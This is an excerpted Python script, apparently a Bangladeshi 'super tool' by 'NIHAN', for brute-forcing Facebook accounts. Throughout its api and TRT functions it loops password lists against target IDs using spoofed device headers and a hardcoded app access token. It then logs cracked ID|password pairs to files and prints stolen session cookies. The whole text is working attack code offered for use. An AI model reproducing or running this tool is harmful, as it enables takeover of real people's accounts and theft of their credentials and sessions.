...
os.system('xdg-open https://chat.whatsapp.com/EqPbpdrc89wBlbBmmnyi8a')
...
\033[1;37m$$ |\$$$ |  $$ |  $$ |  $$ |$$ |  $$ |$$ |\$$$ |   
\033[1;37m$$ | \$$ |$$$$$$\ $$ |  $$ |$$ |  $$ |$$ | \$$ |   
\033[1;37m\__|  \__|\______|\__|  \__|\__|  \__|\__|  \__|        
\033[1;37m--------------------------------------------------
[~] Author   : NIHAN 
[~] Whatsapp  : 01981002555
[~] Tool     : super tool 
[~] Version  : 0.1 
\033[1;37m----------------------------------------------""")
def linex():
...
def pak():
		user=[]
		clear()
		print('\033[1;35m Code example: 017,019,016,018')
...
def gmail():
		...
		clear()
		print('\033[1;37m example: Nihan, nil, sagor, vai\033[1;97m')
		linex()
...
def api1(ids,names,passlist):
		try:
			...
			for pw in passlist:
				...
				q = json.loads(po)
				if 'session_key' in q:
					print('\r\r\033[1;32m [NIHAN-OK] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/TRT-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\x1b[38;5;205m [NIHAN-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [NIHAN-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[NIHAN-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
...
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [NIHAN-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
"Content-Length": "329",}
                        ...
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [NR-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[NR-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [NR-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
...
def api4(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [NR-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api5(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [NR-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api6(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [NR-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in TRT:
				...
				print('\r\r\033[1;32m [NR-OK] %s | %s'%(ids,pas))
				open('/sdcard/TRT-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
...
def api8(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [NR-M8] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
def TRT1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [NR-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
...
'Content-Length': '698'}
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [NR-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;205m [NR-CP] '+str(uid)+' | '+pas+'\033[1;97m')
...
def TRT2(ids,passlist):
	...
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;37m [NR-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
			application_version_code=str(random.randint(000000000,999999999))
			__iam_genius = random.choice(android_models)
			phone_model = __iam_genius.split('|')[0]
			...
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [NR-OK] '+udx+' | '+pas+'\033[1;97m')
...
def TRT3(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [NR-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
    ...
    # 'cookie': 'vpd=v1%3B665x360x2; wl_cbv=v2%3Bclient_version%3A2266%3Btimestamp%3A1685764581; fr=074V4VyxKKfuZaexu.AWU38bJOVzYk7k_-gA071ERn2Vk.BkeaV_.ed.GR6.0.0.Bke4UL.AWWuQq3KxGQ; datr=C4V7ZO-8fW41QMLBsTUoB3fD; dpr=2; wd=996x1840; sb=MYV7ZJgTts2wcsaOlfgMUUIs',
...
response = requests.get('https://mbasic.facebook.com/', cookies=cookies, headers=headers).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
...
def TRT4(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [NR-M4] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [NR-2F] '+uid+' | '+pas)
					else:
				...
				if uid in cps:pass
					...
					print('\r\r\x1b[38;5;205m [NR-CP] '+uid+' | '+pas+'\033[1;97m')
